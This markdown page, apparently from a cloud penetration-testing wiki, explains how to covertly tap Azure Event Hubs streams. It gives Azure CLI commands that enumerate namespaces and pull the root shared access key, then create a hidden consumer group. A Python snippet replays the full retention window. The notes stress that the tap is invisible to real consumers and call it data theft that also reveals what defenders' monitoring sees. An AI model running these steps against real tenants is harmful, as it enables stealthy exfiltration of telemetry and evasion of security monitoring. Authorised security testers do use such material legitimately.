---
title: "Event Hubs: tapping a stream to capture telemetry and events"
order: 2
description: "Tapping Azure Event Hubs streams to capture telemetry and event data."
keywords:
  - Event Hubs
  - stream
  - telemetry
  - capture
  - consumer group
---

# Event Hubs

Event Hubs is Azure's high-throughput event ingestion stream, carrying telemetry, logs, clickstreams, and application events toward their processors. Read access through a **shared access signature** or an RBAC data role lets you attach your own **consumer group** and quietly tap the stream, reading everything flowing through without disturbing the legitimate consumers.

## Enumerating access

```bash
az eventhubs namespace list -o table
az eventhubs eventhub list --namespace-name <ns> -g <rg> -o table
az eventhubs namespace authorization-rule keys list \
  --namespace-name <ns> -g <rg> --name RootManageSharedAccessKey
```

## Tapping the stream

```bash
# add your own consumer group so you do not share offsets with real readers
az eventhubs eventhub consumer-group create \
  --namespace-name <ns> -g <rg> --eventhub-name <hub> --name tap

# read with the connection string via the SDK
python - <<'PY'
from azure.eventhub import EventHubConsumerClient
c = EventHubConsumerClient.from_connection_string("<conn-str>", consumer_group="tap", eventhub_name="<hub>")
def on_event(ctx, ev): print(ev.body_as_str())
c.receive(on_event, starting_position="-1")   # -1 = from the start of retention
PY
```

## Exploitation notes

- A dedicated consumer group means your reads do not move the real consumers' checkpoints, so the tap is invisible at the application layer.
- `starting_position="-1"` replays the full retention window (often 1 to 7 days), so a late tap still captures historical data.
- Event Hubs frequently carries the exact telemetry that feeds SIEM and monitoring, so a tap is both data theft and insight into what defenders see.

## Tools

- **Azure CLI** (`az eventhubs`): namespace, hub, consumer-group, and key enumeration.
- **azure-eventhub** Python SDK: data-plane stream read.
- **MicroBurst**: recovers namespace connection strings from configuration.

## References

- [HackTricks Cloud: Azure Event Hubs](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
- [Microsoft: Event Hubs authentication](https://learn.microsoft.com/azure/event-hubs/authenticate-shared-access-signature)
